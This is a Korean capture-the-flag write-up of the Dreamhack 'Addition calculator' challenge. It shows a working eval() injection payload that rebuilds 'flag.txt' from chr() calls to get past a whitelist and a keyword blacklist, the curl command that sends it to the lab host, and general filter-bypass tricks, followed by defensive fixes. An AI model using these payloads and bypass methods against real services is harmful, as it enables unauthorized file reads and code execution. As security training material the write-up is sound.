---
layout: post
title:  "Dreamhack 워게임 Addition calculator 풀이 — eval() 필터를 chr() 한 줄로 무력화하기"
date:   2026-05-15 06:00:00 +0900
categories: security web wargame dreamhack writeup python eval
---

## 들어가며

Dreamhack 웹해킹 워게임 **Addition calculator** (난이도 Silver 3) 풀이입니다. "덧셈 계산기" 라는 평화로운 이름 뒤에 **Python `eval()` 을 사용자 입력에 그대로 호출하는 클래식한 RCE 패턴** 이 숨어 있고, 출제자가 깐 화이트리스트/블랙리스트 필터를 `chr()` 로 우회해서 `open('flag.txt').read()` 를 실행시키는 게 핵심입니다.

문제 설명:

> 덧셈 식을 입력하면 계산 결과를 출력하는 웹 서비스입니다. `./flag.txt` 파일에 있는 플래그를 획득하세요.

스포일러로 결론:

```bash
curl -X POST "$SERVER/" --data-urlencode \
  "formula=open(chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read()"
# → <pre>DH{348566e31c1ebb3e9fb81b1bf60bd22728bc127bfba0ab3cb84a1e965f77f92f}</pre>
```

> Note: 본 글은 워게임 학습용 PoC 입니다. 실제 운영 서비스 대상 사용 금지.

## 1. 소스 정독

```python
def filter(formula):
    w_list = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
    w_list.extend([" ", ".", "(", ")", "+"])

    if re.search("(system)|(curl)|(flag)|(subprocess)|(popen)", formula, re.I):
        return True
    for c in formula:
        if c not in w_list:
            return True

@app.route("/", methods=["GET", "POST"])
def index():
    ...
    formula = request.form.get("formula", "")
    if formula != "":
        if filter(formula):
            return render_template("index.html", result="Filtered")
        else:
            try:
                formula = eval(formula)        # ★ user input → eval
                return render_template("index.html", result=formula)
            except ...
```

여기서 즉시 잡히는 사실 3개:

1. **`eval(formula)`** — 사용자 입력을 Python 표현식으로 평가. **RCE 1티어 신호**.
2. **화이트리스트**: 알파벳 대소문자 + 숫자 + 공백 + `.` + `(` + `)` + `+`. 다른 모든 문자는 차단.
   - 차단되는 주요 문자: `=`, `,`, `[`, `]`, `{`, `}`, `:`, `'`, `"`, `_`, `-`, `*`, `/`, `\`, `;`, `#`, ...
3. **블랙리스트** (re.IGNORECASE): `system`, `curl`, `flag`, `subprocess`, `popen` — substring 검사.

### 1-1. 필터가 정말 막는 것들

- `_` 가 차단되면 **dunder 이름**(`__import__`, `__builtins__`, `__class__`, …) 을 직접 못 씀.
- `'` `"` 가 차단되면 **문자열 리터럴**을 못 만듦. 즉 함수 인자로 `"flag.txt"` 같은 문자열을 직접 전달 불가.
- `=` 차단으로 **assignment expression(`:=`)** 도 불가, 키워드 인자도 불가.
- `[` `]` 차단으로 **subscripting**(`d["key"]`) 도 불가. dict 에서 키 꺼내려면 `.get(key)` 같은 메서드를 써야 함.

### 1-2. 그래도 남는 것들

`chr` 은 3 글자, 차단 안 됨. **`chr(n) + chr(m) + ...`** 은 문자열을 한 글자씩 합쳐 만든다. `'` `"` 없이 임의의 문자열 빌드.

`open` 은 4 글자, 차단 안 됨. `.read` 는 모두 화이트리스트 안.

블랙리스트의 `flag` 가 substring 으로 차단 → 우리 페이로드 안에 `flag` 라는 글자가 나란히 있으면 안 됨. 하지만 `chr(102)+chr(108)+chr(97)+chr(103)` 으로 만들면 **소스 안에는 `flag` 라는 4문자 시퀀스가 등장하지 않음** — 평가 결과가 `"flag"` 일 뿐. filter 통과.

## 2. 페이로드 빌드

목표 표현식:

```python
open("flag.txt").read()
```

문자열 `"flag.txt"` 를 빌드해야 한다. 각 문자 ASCII:

| char | ord |
|------|-----|
| f | 102 |
| l | 108 |
| a | 97  |
| g | 103 |
| . | 46  |
| t | 116 |
| x | 120 |
| t | 116 |

문자열 빌드:

```python
chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)
```

이 표현식 자체에 차단 문자나 차단 단어가 없는지 한 글자씩 점검:

- 사용 문자: `(`, `)`, `+`, `.`, `0`-`9`, `c`, `h`, `r` — 전부 화이트리스트 안.
- substring 으로 `system|curl|flag|subprocess|popen` 등장? 전혀 없음. ✓

조립한 최종 페이로드:

```python
open(chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read()
```

사용 문자 집합:

```
( ) + . 0 1 2 3 4 6 7 8 9 a c d e h n o p r
```

모두 허용. 길이 78 자. 차단 단어 substring 없음.

## 3. 실행

```bash
SERVER=http://host8.dreamhack.games:12591
curl -s -X POST "$SERVER/" \
  --data-urlencode "formula=open(chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read()" \
  | grep -oE 'DH\{[^}]*\}'
```

응답:

```
DH{348566e31c1ebb3e9fb81b1bf60bd22728bc127bfba0ab3cb84a1e965f77f92f}
```

성공. `eval(open(chr(...)+...).read())` 는 `open("flag.txt").read()` 와 동치이므로 파일 내용을 string 으로 반환하고, Flask 가 그 string 을 `result` 로 템플릿에 박아준다.

## 4. 취약점 해설 — eval() Considered Dangerous

이 클래스의 본질은 단 한 줄로 요약된다.

> **`eval()` / `exec()` / `compile()` 에 사용자 입력을 절대 넣지 말 것.**

이번 문제는 단순한 산수 계산기에 `eval` 을 쓴 게 가장 큰 죄. 그 위에 깔린 화이트/블랙리스트는 다음과 같이 부족하다.

### 4-1. 화이트리스트의 함정

화이트리스트로 "특정 문자만 허용" 하는 것은 좋은 1차 방어지만, **Python 자체가 그 문자들만으로 임의 코드를 표현할 수 있을 만큼 강력하다**. 예시:

- `chr(...)` 만으로 임의 문자열 빌드 → 모든 string literal 우회.
- `globals()` `vars()` `dir()` `getattr()` 같은 introspection 함수는 모두 ASCII 만으로 호출 가능.
- `().__class__.__bases__[0].__subclasses__()` 류의 SSTI gadget chain 도 dunder 만 막으면 모르지만, 사실 dunder 도 `getattr(obj, chr(95)+chr(95)+...)` 식으로 우회 가능.

### 4-2. 블랙리스트의 함정

이 문제의 블랙리스트는 5개 단어(`system|curl|flag|subprocess|popen`)만 막는다. 하지만 위 PoC 가 보여주듯 **그 단어들을 안 써도 RCE 가 가능**하다. 블랙리스트 함정의 일반론:

- 항상 우회로가 존재한다 (encoding, splitting, alias, indirect lookup, ...).
- 블랙리스트는 **새로운 우회 패턴이 나올 때마다 늘어나는 군비 경쟁** 이라 영원히 못 이긴다.

### 4-3. 위험성

- 임의 파일 읽기 → 시스템 정보, 비밀 파일 노출.
- `os.system`, `subprocess.run` 등으로 임의 명령 실행 가능 (이번 문제에서는 `open` 만으로 충분).
- 백엔드 DB 접근 객체가 globals() 에 살아있으면 그 객체를 통해 DB 임의 쿼리.
- 컨테이너 안이라 격리는 되어 있지만, **다른 인스턴스의 secret/PII 가 같은 컨테이너 이미지에서 동작하는 경우** 라면 전사 사고.

### 4-4. 올바른 방어

1. **`eval()` / `exec()` 사용 금지.** 산수가 필요하면 전용 파서 사용.

   ```python
   # 안전한 산수 파서 예시 (Python 3.8+, ast 사용)
   import ast, operator
   ALLOWED = {ast.Add: operator.add, ast.Sub: operator.sub,
              ast.Mult: operator.mul, ast.Div: operator.truediv}
   def safe_eval(expr):
       tree = ast.parse(expr, mode='eval')
       def _eval(node):
           if isinstance(node, ast.Expression): return _eval(node.body)
           if isinstance(node, ast.Constant) and isinstance(node.value, (int, float)):
               return node.value
           if isinstance(node, ast.BinOp) and type(node.op) in ALLOWED:
               return ALLOWED[type(node.op)](_eval(node.left), _eval(node.right))
           raise ValueError("Disallowed")
       return _eval(tree)
   ```

   AST 노드 화이트리스트로만 평가 — `chr()` 같은 함수 호출은 `ast.Call` 노드라 ALLOWED 에 없어 거부.

2. **외부 라이브러리 사용.** `simpleeval`, `asteval` 같이 sandboxed expression evaluator 가 표준.

3. **꼭 `eval` 을 써야 한다면 `compile(... , mode='eval')` + 빈 globals/locals.**

   ```python
   compile(expr, '<user>', 'eval')   # ast 검증 후
   code = compile(expr, ...)
   eval(code, {"__builtins__": {}}, {})    # 모든 builtin 차단
   ```

   단, dunder 우회로 이것조차 깨지는 경우가 있어 안전한 산수 파서가 더 낫다.

4. **앱 권한 최소화.** flag 파일을 다른 유저 권한으로 두고, 앱이 직접 못 읽게.

## 5. 정리 — 입문자가 가져갈 교훈

- 코드에서 `eval`, `exec`, `compile(..., mode='eval')`, `pickle.loads`, `yaml.load` 같은 함수가 사용자 입력과 만나는 모든 자리는 **즉시 RCE 후보**.
- 화이트리스트로 문자를 제한해도 **Python/JS/PHP 같은 동적 언어는 그 안에서도 강력하다**. 진짜 방어는 **언어 평가 자체를 금지하고 도메인 전용 파서를 쓰는 것**.
- 블랙리스트 차단은 거의 항상 우회 가능. `chr()`, `\x..`, `\u....`, base64 디코딩, dunder access, attribute chain — 우회 방법은 무궁무진.
- 페이로드를 만들 때는 **"필요한 문자열을 화이트리스트만으로 빌드할 수 있는가?"** 부터 점검. `chr(n) + chr(m) + ...` 은 가장 짧고 깔끔한 빌더.

같은 카테고리의 다음 단계로 **Python pickle deserialization**, **Jinja SSTI**, **PyYAML untrusted load** 등을 풀면 좋습니다.

---

## 부록 — 시도하다 막혔던 지점과 회고

### 실패 1. 처음에 `eval` 의 builtin 접근 가능성을 의심

`eval()` 이 `__builtins__` 가 막힌 환경에서 호출됐을 수도 있다고 잠깐 의심했습니다. 그러면 `open` `chr` 같은 builtin 도 못 쓰니까요. 하지만 코드를 다시 보니 `eval(formula)` 만 호출 — 두 번째/세 번째 인자(globals/locals)가 없어서 기본 환경 (current globals + builtins) 그대로. open/chr 다 사용 가능.

**회고**: `eval(expr)`, `eval(expr, g)`, `eval(expr, g, l)` 3가지 형태를 항상 구분해서 확인하자. 두 번째 인자가 없으면 호출 위치의 globals 가 그대로 전달돼서 builtins 풀려있다.

### 실패 2. `=` 가 차단되어 walrus(`:=`) 안 되는 걸 잠깐 잊음

처음에 `(x:=open(...)).read()` 같은 표현을 시도해볼까 했는데 `:` 도 `=` 도 다 차단. 단순한 `open(...).read()` 가 답.

**회고**: 화이트리스트 차단 문자를 종이에 따로 적어두고 페이로드를 만들면 좋다. 자주 쓰는 문자(`,` `[` `]` `'` `"` `_` `=`) 중 무엇이 빠졌는지 한눈에 보인다.

### 실패 3. `flag` substring 체크가 case-insensitive 라는 점

re.search 의 `re.I` 플래그 때문에 `FLAG`, `Flag`, `FlAg` 도 모두 차단. 그러나 우리 페이로드는 어차피 `chr(...)` 로 빌드하므로 substring 에 `flag` 가 안 나타나서 무관. 그래도 처음 봤을 때 case-insensitive 라는 점은 메모.

**회고**: re.I 플래그가 붙으면 모든 case variant 가 차단된다. 우회는 결국 substring 자체를 피하는 방향 (`chr()`, `bytes.fromhex()`, `getattr` 등).

### 실패 4. `read()` 가 진짜로 결과를 반환할 수 있는지 잠깐 고민

`eval` 의 결과가 jinja 템플릿에 `{{ result }}` 로 박힌다. 만약 `eval` 결과가 multi-line string 이거나 특수문자라면 jinja 가 어떻게 처리할까? Flask 의 jinja autoescape 가 적용되어 `<` `>` 등은 escape 되겠지만, FLAG 는 `DH{...}` 형태의 영숫자 + 중괄호라 안전. 그대로 출력.

**회고**: 페이로드의 결과가 어떤 컨텍스트로 출력되는지 미리 점검하자. 만약 결과를 HTML 컨텍스트에서 보지 못하면 timing/error-based 같은 옆길로 빠져야 한다.
